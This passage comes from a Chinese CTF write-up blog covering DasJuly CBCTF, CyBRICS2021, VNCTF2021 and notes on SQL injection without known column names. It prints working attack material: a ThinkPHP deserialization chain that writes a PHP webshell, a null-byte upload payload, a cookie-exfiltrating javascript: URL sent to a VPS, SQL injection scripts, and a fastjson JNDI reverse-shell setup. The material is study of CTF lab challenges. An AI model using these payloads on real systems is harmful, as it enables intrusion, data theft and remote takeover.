relation类的子类，并且也是OnetoOne类的子类==\u0026gt;\u0026gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$query指向Query $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $value值，作为call函数引用的第二变量 } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } \u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Model的子类new Pivot(); Model是抽象类 } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output; $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //调用getError 返回this-\u0026gt;error $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==\u0026gt;\u0026gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$query指向Query $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $value值，作为call函数引用的第二变量 } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../public/uploads/images/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } 文件名的生成规则是：原本的文件名+md5('tag_'+md5($this-\u0026gt;tag))+'.php'，这里的话就是'a.php'+md5('tag_'+md5('xxx'))+'.php'，即a.php12ac95f1498ce51d2d96a249c09c1998.php\n有个小坑，这里的根目录不可写，所以无法成功写马，所以我们换到/public/uploads/images这个目录下面，或者/runtime/temp这个目录也行，最终payload：\n1 /index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A144%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fpublic%2Fuploads%2Fimages%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 最后执行根目录的readflag即可：\njj\u0026rsquo;s camera 挺有意思的一道题目。\n打开之后的页面是这样的：\n点击生成链接之后底下会生成一个可以跳转的链接：\n但是除了弹出一个框就啥也没了：\n然后点击查看照片也是一直显示没有照片：\n懵了半天，然后拿到Firefox打开的时候，发现它提示我是否允许开启摄像头权限，联想到题目的名字”jj\u0026rsquo;s camera“，把摄像头的权限给了他看看，反正咱也贴了胶布不是。然后会发现他会拍下一张照片并提交给qbl.php，然后跳转到上边填写的链接。\n把上边的串起来，这个网站就是一个钓鱼的后台，生成钓鱼链接，当受害者点击生成的链接并且给了摄像头权限之后就可以拍到受害者的照片并返回给后台。\n这个qbl.php就是接受照片并处理跳转的php，因为名字起的挺奇怪的，所以我们就直接去google它，然后发现网上有源码：\n链接：在吗宝贝？你点开这个网址看看【打开网站偷拍照片】] - 知乎 (zhihu.com)\nqbl.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//存放在当前目录的img文件夹下 if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt; 注意到服务器的php版本是5.2.17，对代码进行审计，我们可以在id处利用00截断，将后边的png后缀去掉，从而上传shell，payload：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /qbl.php?id=shell.php%00a\u0026amp;url=http://baidu.com HTTP/1.1 Host: node4.buuoj.cn:27340 Content-Length: 106 Cache-Control: max-age=0 Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;91\u0026#34;, \u0026#34; Not;A Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 Origin: https://node4.buuoj.cn:27340 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-Dest: document Referer: https://node4.buuoj.cn:27340/sc.php?id=1\u0026amp;url=http://baidu.com Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close img=data%3Aimage%2Fpng%3Bbase64%2CPD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pO0BldmFsKCRfUE9TVFtrMXRlXSk7Pz4= 图片会放在img目录下，直接去找就行:\nMisc Just a GIF 将gif逐帧分解之后发现很多冗余图片，每11张一个循环，遂写脚本看看那些地方不同：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import os from PIL import Image if __name__ == \u0026#34;__main__\u0026#34;: # gif逐帧分解 im = Image.open(\u0026#39;Just_a_GIF.gif\u0026#39;) if not os.path.exists(\u0026#39;src\u0026#39;): os.mkdir(\u0026#39;src\u0026#39;) count = 0 try: while True: im.seek(count) im.save(\u0026#39;src/\u0026#39; + str(count) + \u0026#39;.png\u0026#39;) count = count + 1 except: pass print(\u0026#39;帧数\u0026#39; + str(count)) # 找不同 if not os.path.exists(\u0026#39;result\u0026#39;): os.mkdir(\u0026#39;result\u0026#39;) rows = 119 cols = 83 for column in range(11): result = Image.new(\u0026#39;RGBA\u0026#39;,(rows,cols),\u0026#39;black\u0026#39;) for row in range(1,41): origin = Image.open(f\u0026#34;src/{column}.png\u0026#34;).convert(\u0026#39;RGBA\u0026#39;).load() diff = Image.open(f\u0026#34;src/{row*11+column}.png\u0026#34;).convert(\u0026#39;RGBA\u0026#39;).load() for x in range(rows): for y in range(cols): if origin[x,y] != diff[x,y]: result.putpixel((x,y),(255,255,255,255)) result.save(f\u0026#39;result/{column+1}.png\u0026#39;) 得到若干长得像二维码的图片以及两张顺序图，很明显是贴起来了，但是图片右边有黑边，先切掉再拼接：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from PIL import Image images = [] flag = Image.new(\u0026#39;RGB\u0026#39;,(83*3,83*3)) for i in range(1,10): im = Image.open(f\u0026#34;result/{i}.png\u0026#34;) images.append(im.crop((0,0,83,83))) order = [ [7,1,6], [9,3,4], [5,2,8] ] for row in range(3): for col in range(3): index = order[row][col] flag.paste(images[index-1],(col*83,row*83)) # flag.show() flag.save(\u0026#39;flag.png\u0026#39;) 是个DataMatrix，直接识别即可\n写在最后 其实不能说题目质量不行，只是因为比赛的时候时间紧，所以就只能直接拿网上的payload打，但是赛后再来看看，照着网上的文章，一个函数一个函数跟进，还是能学到很多东西的。\n","date":"2021-08-03T10:42:08+08:00","permalink":"https://k1te.cn/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/","title":"DasJuly X CBCTF 4th 部分wp"},{"content":"全程被队友们带飞，虽然最后的成绩肯定比不上大佬们的战队，但还是玩的很开心\nWeb Ad Network 左上角有一张图片，点击之后会不停地重定向，我们只需要修改浏览器的重定向次数，然后让浏览器一直跳就可以了：\nAnnouncement 注入点在email处，insert注入，左边的digest是email的md5：\n简单的报错注入，因为不想频繁算md5，于是写了个脚本:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import requests import hashlib import re session = requests.Session() def genearteMD5(str): # 创建md5对象 hl = hashlib.md5() # Tips # 此处必须声明encode # 否则报错为：hl.update(str) Unicode-objects must be encoded before hashing hl.update(str.encode(encoding=\u0026#39;utf-8\u0026#39;)) return hl.hexdigest() # 数据库 announcement payload = \u0026#34;1\u0026#39;or updatexml(1,concat(0x7e,(database()),0x7e),1) or\u0026#39;\u0026#34; # 表 emails,logs payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;announcement\u0026#39;),0x7e),0) or\u0026#39;\u0026#34; # 列 log payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;logs\u0026#39;),0x7e),0) or\u0026#39;\u0026#34; # 内容 cybrics{1N53r7_0ld_900d_5ql} payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(log) from logs),0x7e),0) or\u0026#39;\u0026#34; print(\u0026#34;payload: \u0026#34;+payload) captcha = genearteMD5(payload) print(captcha) paramsPost = {\u0026#34;digest\u0026#34;:captcha,\u0026#34;email\u0026#34;:payload} headers = {\u0026#34;Origin\u0026#34;:\u0026#34;http://announcement-cybrics2021.ctf.su\u0026#34;,\u0026#34;Cache-Control\u0026#34;:\u0026#34;max-age=0\u0026#34;,\u0026#34;Accept\u0026#34;:\u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#34;,\u0026#34;Upgrade-Insecure-Requests\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;User-Agent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\u0026#34;,\u0026#34;Referer\u0026#34;:\u0026#34;http://announcement-cybrics2021.ctf.su/\u0026#34;,\u0026#34;Connection\u0026#34;:\u0026#34;close\u0026#34;,\u0026#34;Accept-Encoding\u0026#34;:\u0026#34;gzip, deflate\u0026#34;,\u0026#34;Accept-Language\u0026#34;:\u0026#34;zh-CN,zh;q=0.9\u0026#34;,\u0026#34;Content-Type\u0026#34;:\u0026#34;application/x-www-form-urlencoded\u0026#34;} response = session.post(\u0026#34;http://announcement-cybrics2021.ctf.su/\u0026#34;, data=paramsPost, headers=headers) try: print(re.search(\u0026#34;XPATH syntax error: \u0026#39;(.*?)\u0026#39;\u0026#34;,response.text).group()) except: print(response.text) Multichat 点开之后一个网络聊天界面，可以加入不同的room，根据题目描述，我们需要找到tech support和admin所在的房间号，然后向admin发送一段文字即可，所以现在的问题就是如何找到这个房间号，房间号的范围特别大，爆破是不可能爆破的了，还有一个技术支持界面跑在5000端口，点击电话图标即可跳转。\n说实话不是很懂为什么技术支持要填url，但是题就这么出的，刚开始尝试自己的vps，但是一直没有log，然后又尝试填了xss平台的url，还是不行，最后填了pipedream的才终于可以。然后赛后听队友分享的时候发现大家都有发送成功的回显，而我虽然能收到请求，但是页面直接是502。。。自闭。。。接着也不知道该如何测试，后面问了队友才知道可以使用javascript:，然后就去google了一下，找到了一个有点关联的：Call Javascript function from URL/address bar - Stack Overflow，还有篇博客：一个神奇的Javascript运行方式\u0026ndash;URL中的JavaScript - 程序员最后都要送外卖 - 博客园 (cnblogs.com)。大概意思就是在浏览器的地址栏中输入形如：javascript:XXX的语句的时候，浏览器会把后面的xxx当作js执行。这种方法只会被浏览器解释，其他的curl之类的好像不行，所以猜测后台有个bot模拟tech support把我们的url贴到浏览器跑？\n所以我们可以使用payload：javascript:location.href='http://vps/?'+document.cookie来把cookie带出来。\n然后得到房间号拿flag：\nCyber and rebyC Mic Check 签到其实挺有意思的，对前端不是很熟悉，具体不是很清楚怎么实现的，效果就是这段文字看起来是flag，但是直接复制的话是另一段假的flag，不过赛后没了，不然还能研究研究。\nScanner 挺好玩的一道题，用一张动图模拟扫描，然后让你认出这是啥，例如这个小房子：\n思路其实也很简单，只需要把gif一帧一帧拆成png然后再贴起来即可，考虑到，直接贴起来可能会有重复的部分，通过观察大概每隔一张贴起来比较合适，用pillow库写了个脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import os from PIL import Image import requests if __name__ == \u0026#34;__main__\u0026#34;: # 将gif分解成png im = Image.open(\u0026#39;vid.gif\u0026#39;) os.mkdir(\u0026#39;src\u0026#39;) count = 0 try: while True: im.seek(count) im.save(\u0026#39;src/\u0026#39; + str(count) + \u0026#39;.png\u0026#39;) count = count + 1 except: pass print(\u0026#39;帧数\u0026#39; + str(count)) # 将每张png合起来 target = Image.new(\u0026#39;RGB\u0026#39;,(1080,1606)) # 每隔一张图片，截取一定的部分，并且拼接起来 for i in range(0,145,2): img = Image.open(\u0026#39;src/\u0026#39;+ str(i) +\u0026#39;.png\u0026#39;) cropped = img.crop((0,496,1080,517)) target.paste(cropped,(0,i*11)) target.save(\u0026#34;vid.png\u0026#34;) 其实前四个是肉眼看出来的，然后第五个看不出来了，写了个脚本才发现是个二维码，最后扫码即可得到flag：\nCAPTCHA The Flag 刚开始没仔细看，居然不知道该咋做。。。其实很简单，只需要把图片扒拉下来，然后用StegSolve打开，调到特定的通道即可。\n","date":"2021-07-26T14:42:08+08:00","permalink":"https://k1te.cn/p/cybrics2021/","title":"CyBRICS2021"},{"content":"ctf无列名注入小结 其实之前也遇到过类似的题目，但是拖延症太严重了，一直没有仔细研究，正好这次国赛初赛也有一道无列名注入的题目，好好学习一下。\n无列名注入一般伴随着bypass information_schema，当这个表被过滤的时候，我们只能使用sys.schema_auto_increment_columns、sys.schema_table_statistics_with_buffer、mysql.innodb_table_stats等等进行绕过，但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入\n一、列名重复（join……using） 条件：需要开启报错\n直接拿sqli-labs的email表来做演示（后面也会使用这个表）：\n假设我们已经bypass了information_schema并且获得了emails这个表名，这时候我们可以使用?id=1' union select * from (select * from emails a join emails b)c--+dump出第一个字段名：\n紧接着使用?id=1' union select * from (select * from emails a join emails b using(id))c--+dump出第二个字段名：\n一般网上的文章到这里就结束了，但是搞不明白原理是啥（可能是因为我太菜了），所以自己又接着往下研究。\n当我们继续使用?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+，会报列数不一致的错误：\n因为这个时候已经select成功了，但是只有两列，而union前面的语句有三列，所以列数不一致，在命令行里是可以成功select的：\n或者这样：\n所以join……using到底是啥呢，我又去Google了一下：SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。\njoin有不同的类型：\nINNER JOIN：如果表中有至少一个匹配，则返回行 LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 FULL JOIN：只要其中一个表中存在匹配，则返回行 其中inner join 和 join是相同的\nsecurity中还有一个users表如下：\n当我们跨表查询对应用户的email的时候就可以使用join语句，有以下三种写法：\n1 2 3 select * from users join emails on emails.id = users.id; select * from users join emails using(id); select * from users,emails where users.id = emails.id; 我们可以看到当我们使用using的时候id这个字段只出现了一次，但是where和on都出现了两次，并且不会报错。\n但是如果我们在外边套一层select，情况就不一样了\n1 2 3 select * from (select * from users join emails on emails.id = users.id)a; select * from (select * from users join emails using(id))a; select * from (select * from users,emails where users.id = emails.id)a; 可以看到只有using不会报错，其他两个都报了列名重复的错误，并且指出了具体的列名\n假设我们不知道任何列名，把后面的on、using、where都删掉：\n都可以爆出第一个字段（虽然说删了之后前面没有区别），但是当我们知道了第一个字段，想要爆出第二个字段的时候，结果就不一样了。（因为email和user只有一个列名重复，所以join两个一样的表（一般都join一样的表），同时还需要给这两个表取两个别名，不然会报表名不唯一的错误:Not unique table/alias: 'emails'）：\n1 2 3 4 5 6 select * from (select * from emails a join emails b on a.id = b.id)a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;id\u0026#39; select * from (select * from emails a join emails b using(id))a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;email_id\u0026#39; select * from (select * from emails a,emails b where a.id = b.id)a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;id\u0026#39; 可以看到，只有using可以dump出第二个字段，原因想必大家看到这里都明白了，即便我们指定了where和on，select出来的表依然有重复的字段，但是using不会，所以第一个和第三个指令依然报错id字段重复，而第二条指令则开始报剩下的字段的名字。\n二、通过别名，引用列名（需要使用union） 条件：有查询内容回显\n2021国赛初赛的easy_sql之所以不使用这个方法，是因为union被过滤了，所以这也是一个条件吧。\n假设我们不知道emails的字段名，我们可以将他的列名转化为别名：select 1,2 union select * from emails;\n然后我们可以引用这个我们已知的别名来获得数据：select 2 from (select 1,2 union select * from emails)x;：\n当反引号被ban的时候可以使用别名：select a from (select 1,2 a union select * from emails)x;(省略了as)\n或者使用双引号：select a from (select 1,\u0026quot;a\u0026quot; union select * from emails)x;\n在sqli-lab中的演示：\n三、比较盲注 条件：盲注的条件\n上面两种方法要么需要报错，要么需要回显，那么盲注的条件下咋办呢，在知道表名的情况下我们可以先select出想要的内容，然后再构造一个内容与其比较，作为盲注时判断的条件。\n例如：select * from users limit 1;得到：\n我们可以构造select 1,0,0;\n然后与其比较：select (select ((select 1,0,0)\u0026gt;(select * from users limit 1)));\n结果为false，说明1不大于第一个字段的值\n接着：select (select ((select 2,0,0)\u0026gt;(select * from users limit 1)));\n结果为true，说明2大于第一个字段的值，结合上面的可以知道第一个字段的值为1。剩下的以此类推。\n当我准备接着注下去的时候，发现报错了：\n仔细和网上的文章对照了一下，发现payload没有问题，猜测是数据库版本的问题，现在使用的版本是5.5：\n抱着怀疑的心态换了个5.7的mysql，然后顺便创建了一个test表：\n然后继续尝试刚刚的payload：select ((select 1,\u0026quot;f\u0026quot;)\u0026gt;(select * from test limit 1));\n发现可行，应该是某个版本之后这两者可以进行比较，但是具体哪个版本没有进行尝试（又懒又菜），知道的师傅可以和我说一下。\n——————————————————————————\n在数据库中操作完之后开始复盘。\n首先我们得知道表名，这个上边讲过了；其次是得知道这张表中有多少个字段，这个我认为可以通过order by来确定：\n然后得知道有多少行，当大于一行的时候得加上limit不然会报错，永远都返回false，这个只能靠尝试和猜测吧。。。不过flag表一般就一行\n然后就可以进行盲注了：\n1 2 ?id=1\u0026#39; and ((select \u0026#39;1\u0026#39;,0,0)\u0026gt;(select * from users limit 1))--+ ?id=1\u0026#39; and ((select \u0026#39;2\u0026#39;,0,0)\u0026gt;(select * from users limit 1))--+ 结果：\n四、order by盲注 好像没什么合适的环境，等下回遇到再填坑吧，先贴个链接：一道题引发的无列名注入 | ChaBug安全\n最后 我的数据库基础不扎实，如果有什么错误的地方还希望师傅们多多包涵，如果能和我交流，指出我的错误就更好啦\n参考：\n聊一聊bypass information_schema - 安全客，安全资讯平台 (anquanke.com)\ninformation被ban的情况下进行SQL注入 - Cl4y\u0026rsquo;s SecretCl4y\u0026rsquo;s Secret\n无列名注入总结_D1stiny的博客-CSDN博客_无列名注入\n","date":"2021-05-19T22:10:17+08:00","permalink":"https://k1te.cn/p/ctf%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/","title":"ctf无列名注入小结"},{"content":"Ezgame 在网上找到这个游戏的源码，然后在game.js中搜索win关键词，发现当winTimer.IsSet()返回True时，游戏胜利。\n然后在其他文件里找找，就可以在gameEngine.js中找到Timer类的isSet方法：\nIsSet() { return this.endTime \u0026gt; 0; }\n所以我们可以直接在控制台输入：winTimer.endTime = 1\n然而，有大佬直接从网站源码中解出了flag：\n在源码里面找到了一堆奇怪的东西：\n丢到一个在线加密网站，解密得到flag：\ntql\n（原来直接丢到控制台回车就出来了。。。\nrealezjvav[复现] 第一关是一个笛卡尔积注入，其实当时fuzz出来之后发现sleep benchmark RLIKE get_lock都被ban了，只剩笛卡尔积了，奈何还是太菜了，一直没办法延时，最后又跑去想是不是别的方向。。。\n自己写的脚本：（本来想用三个table的组合，会延时1s左右，但是不知道为啥有时候正常的请求会有5s的延时，所以改用两个table加一个column，这样大概会有13秒左右的延时，然后时差\u0026gt;10s即可；time.sleep(0.1)是怕buu的容器429Too Many Requests）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests import time url = \u0026#34;http://0ce14b29-a69c-47eb-9aa1-2c0c972e4125.node3.buuoj.cn/user/login\u0026#34; ans = \u0026#34;\u0026#34; for i in range(1, 100): flag = 1 for j in range(31,127): # password：no_0ne_kn0w_th1s payload = \u0026#34;1\u0026#39; and if(ascii(substr(password,\u0026#34;+ str(i) +\u0026#34;,1))\u0026gt;\u0026#34;+ str(j) +\u0026#34;,0,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C))#\u0026#34; data = {\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: payload} res = requests.post(url=url, data=data) time.sleep(0.1) # print(payload) print(res.elapsed.total_seconds()) # print(res.status_code) if res.status_code != 200: print(\u0026#34;error \u0026#34;+str(res.status_code)) break if res.elapsed.total_seconds() \u0026gt; 10: if (j != 31): ans += chr(j) flag = 0 break else: break if (flag == 0): print(ans) else: break 登录进去之后是一个头像选择页面，有一个创捷角色功能，burp抓包，传的是json数据：\n然后发现图片的显示是根据：/searchimage?img=2.png，尝试读取flag，但是并不行，因为对java项目的目录结构不清楚，所以啥也读不到，wp里面读取了../../../../../pom.xml，并且在里面找到了fastjson依赖：\n然后根据红队武器库:fastjson小于1.2.68全漏洞RCE利用exp这篇文章进行复现。\n构造恶意java类并起一个http服务 这里用到了34566 34567 34568三个端口，34566是我们反弹shell的监听端口，写在Exploit.java里面（把官方wp的ip改成自己的vps，端口改成34566）；34567是恶意java类的端口，先使用javac Exploit.java生成Exploit.class，然后使用python3 -m http.server 34567起一个http服务：\n然后再浏览器中输入IP地址和端口34567看看有没有开起来：\n如果没有，得把vps防火墙中相应的端口打开。\n开启LDAP服务 34568是ldap服务的端口\ngit clone https://hub.fastgit.org/mbechler/marshalsec.git\n然后cd marshalsec\n接着build（可能需要先sudo apt install maven）：\nmvn clean package -DskipTests\n等待一段时间完成之后会生成一个target目录，cd target\n然后run：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xx.xx.xx.xx:34567/#Exploit 34568\n最后nc -lvvp 34566监听我们反弹shell的端口\n用payload攻击题目服务器 在刚刚抓包发送json数据的地方把我们的payload发送过去（使用Unicode编码）：\n然后反弹shell成功，cat即可拿到flag：\n","date":"2021-03-14T01:47:24+08:00","permalink":"https://k1te.cn/p/vnctf2021/","title":"VNCTF2021"},{"content":"大吉大利杯web部分wp 菜炸了，一部分题是自己做出来的，一部分题是看wp复现的\nspaceman php代码审计，源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class spaceman { public $username; public $password; public function __construct($username,$password) { $this-\u0026gt;username = $username; $this-\u0026gt;password = $password; } public function __wakeup() { if($this-\u0026gt;password===\u0026#39;ctfshowvip\u0026#39;) { include(\u0026#34;flag.php\u0026#34;); echo $flag; } else { echo \u0026#39;wrong password\u0026#39;; } } } function filter($string){ return str_replace(\u0026#39;ctfshowup\u0026#39;,\u0026#39;ctfshow\u0026#39;,$string); } $str = file_get_contents(\u0026#34;php://input\u0026#34;); if(preg_match(\u0026#39;/\\_|\\.|\\]|\\[/is\u0026#39;,$str)){ die(\u0026#34;I am sorry but you have to leave.\u0026#34;); }else{ extract($_POST); } $ser = filter(serialize(new spaceman($user_name,$pass_word))); $test = unserialize($ser); ?\u0026gt; php://input 与 $_POST 